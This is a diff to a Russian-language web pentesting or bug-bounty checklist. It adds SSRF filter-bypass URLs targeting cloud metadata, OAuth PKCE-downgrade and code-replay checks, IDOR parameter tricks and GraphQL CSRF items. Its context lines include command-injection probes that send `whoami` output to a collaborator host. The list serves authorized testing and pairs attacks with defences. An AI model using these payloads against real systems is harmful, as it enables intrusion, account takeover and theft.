@@ -29,7 +29,7 @@
 - [ ] Error-based если ошибки видны в ответе
 
 **Обход WAF / фильтров**
-- [ ] JSON-синтаксис (обход большинства WAF): оператор `'@<` / экранирование через JSON
+- [ ] JSON-синтаксис (обход большинства WAF): оператор `'@>`/`<@`/`?` (JSON-операторы PostgreSQL) / экранирование через JSON
 - [ ] Inline-комментарии: `SEL/**/ECT`, `UN/**/ION`
 - [ ] Смена регистра: `SeLeCt`
 - [ ] Unicode / double-encoding
@@ -92,6 +92,7 @@
 **Обход фильтров**
 - [ ] Decimal/hex IP: `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1`
 - [ ] Userinfo-трюк: `http://localhost@attacker.com`, `http://attacker.com#localhost`
+- [ ] IPv6 / short-form: `http://[::1]/`, `http://[::ffff:169.254.169.254]/`, `http://0/`, `http://0.0.0.0/`; follow-redirect с разрешённого хоста на `169.254.169.254`
 - [ ] Альтернативные схемы: `gopher://` (Redis/SMTP), `dict://`, `file://`
 - [ ] DNS rebinding (TOCTOU) — если валидация и запрос разнесены (Singularity)
 - [ ] Если IMDSv2 включён → искать сервис, рендерящий HTML/XML (iframe `<iframe src="http://169.254.169.254/...">` в pandoc-подобных конвертерах)
@@ -144,6 +145,7 @@
 - [ ] Декодировать «непрямые» ID: base64 (`MTIzNDU2`→`123456`), hash → искать последовательные int
 - [ ] Function-level: обычным юзером дёрнуть `/admin/...`, `/api/internal/...`
 - [ ] Chain: IDOR + Mass Assignment → выставить `password`/`email` на чужой объект → ATO
+- [ ] Array/object-wrap и HPP: `id[]=victim`, `{"id":[victim]}`, дубль `id=self&id=victim` — бэкенд авторизует одно значение, действует на другое
 
 **Инструменты:** Burp **Autorize** (реплей с cookie low-priv), Repeater, Logger, `ffuf` (shadow-эндпоинты, Swagger)
 **Защита (для репорта):** серверная проверка владения объектом; indirect object references; user-context validation
@@ -182,7 +184,7 @@
 
 **Детект**
 - [ ] In-band: `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`, `||id`
-- [ ] Blind time: `;sleep 10`, `& timeout 10`
+- [ ] Blind time: `;sleep 10`, `& ping -n 11 127.0.0.1`
 - [ ] Blind OOB: `;nslookup $(whoami).<collab>`, `;curl http://<collab>/`
 
 **Эксплуатация**
@@ -256,7 +258,7 @@
 ## 10. Insecure Deserialization
 
 **Recon / где искать**
-- [ ] Найти сериализованные данные по сигнатурам: Java `rO0`/`0xACED`, .NET `AAEAAAD`/`0xFFFE`, PHP `O:`/`a:`
+- [ ] Найти сериализованные данные по сигнатурам: Java `rO0`/`0xACED`, .NET `AAEAAAD` / hex `00 01 00 00 00 FF FF FF FF`, PHP `O:`/`a:`
 - [ ] Проверить cookies, `viewstate`, токены, кэш, очереди
 
 **Детект**
@@ -311,9 +313,14 @@
 - [ ] Identity injection: вход по mutable `email` (а не immutable `sub`/Object ID)
 - [ ] Authorization-code swap: украденный code из любого приложения → first-party токен (если не проверяется client/redirect/nonce)
 - [ ] Reflected XSS в `error_description`/`redirectUrl` на trusted callback
+- [ ] PKCE downgrade/removal: убрать `code_challenge` или сменить `S256`→`plain` (или подсунуть свой verifier) → перехваченный code снова годен для обмена
+- [ ] Повторное использование authorization code: сервер не инвалидирует code после первого обмена → реплей украденного code на второй токен
+- [ ] Утечка code/токена через Referer: callback с `code`/`token` в URL утекает на сторонние ресурсы (img/script/link) через заголовок Referer
+- [ ] Scope escalation: подменить/расширить `scope` в запросе авторизации или при обмене → токен с правами больше, чем положено клиенту
+- [ ] IdP mix-up: в мульти-IdP начать flow с IdP-атакующего, подсунуть callback честного IdP → `code` уходит не на тот token-endpoint (если нет `iss`/привязки к IdP)
 
 **Инструменты:** Burp, Doyensec OAuth Security Cheat Sheet
-**Защита (для репорта):** строгая проверка `redirect_uri`; PKCE; верификация email; привязка code к client/redirect/nonce
+**Защита (для репорта):** строгая проверка `redirect_uri`; PKCE (S256, обязательный); верификация email; привязка code к client/redirect/nonce; одноразовый code; проверка `iss`
 
 ---
 
@@ -324,9 +331,9 @@
 - [ ] Password reset: токен утекает в Referer / в ответе / предсказуем
 - [ ] Password reset: `Host`-header poisoning → ссылка с reset-токеном уходит на твой домен
 - [ ] Смена email без re-auth (+ chain с IDOR/Mass Assignment на чужой профиль)
-- [ ] OAuth pre-account takeover (см. §12)
-- [ ] JWT forge (см. §11)
-- [ ] 2FA bypass: response manipulation (`{"success":false}`→`true`), пропуск шага, brute OTP (+ race, см. §15)
+- [ ] OAuth pre-account takeover
+- [ ] JWT forge
+- [ ] 2FA bypass: response manipulation (`{"success":false}`→`true`), пропуск шага, brute OTP (+ race)
 - [ ] Session не инвалидируется после смены пароля
 - [ ] Коллизия username/email: пробелы до/после (`"admin "`), Unicode-нормализация (NFKC) и IDN-гомоглифы (кириллическая `а`, `demⓞ@x.com`) схлопывают твою учётку в чужую при сбросе/слиянии
 
@@ -348,7 +355,7 @@
 - [ ] Манипуляция ценой/валютой/скидкой в запросе
 - [ ] Купоны/рефералы: повторное применение, накрутка
 - [ ] Состояние корзины/заказа: подмена после расчёта цены
-- [ ] Replay одной операции (+ race, см. §15)
+- [ ] Replay одной операции (+ race)
 
 **Инструменты:** ручной анализ + Burp Repeater; Turbo Intruder для граней
 **Защита (для репорта):** серверная валидация инвариантов и переходов состояний; идемпотентность
@@ -404,7 +411,7 @@
 - [ ] Whitelisted-домен в пути/фрагменте
 
 **Chain (главная ценность)**
-- [ ] Client-side open redirect → обход `SameSite=Strict` CSRF (см. §6)
+- [ ] Client-side open redirect → обход `SameSite=Strict` CSRF
 - [ ] Кража OAuth `code`/токена через `redirect_uri`
 - [ ] Усиление SSRF: редирект с разрешённого хоста на `169.254.169.254`
 
@@ -452,6 +459,7 @@
 - [ ] BOLA/IDOR в мутациях (field-level authz часто неполна)
 - [ ] DoS: глубокая рекурсия циклических типов; N alias-копий дорогого резолвера; `first:99999999`
 - [ ] Field suggestions включены → enumeration схемы даже без introspection
+- [ ] GraphQL CSRF: мутация через `Content-Type: text/plain` / `x-www-form-urlencoded` или query-over-GET (обходит JSON-preflight, CSRF-токен не требуется)
 
 **Инструменты:** **InQL**, `GraphQLmap`, GraphQL Voyager, GraphQL Raider
 **Защита (для репорта):** отключить introspection в проде (unauth); query depth/complexity limit; rate-limit по числу операций; persisted queries; per-resolver authz
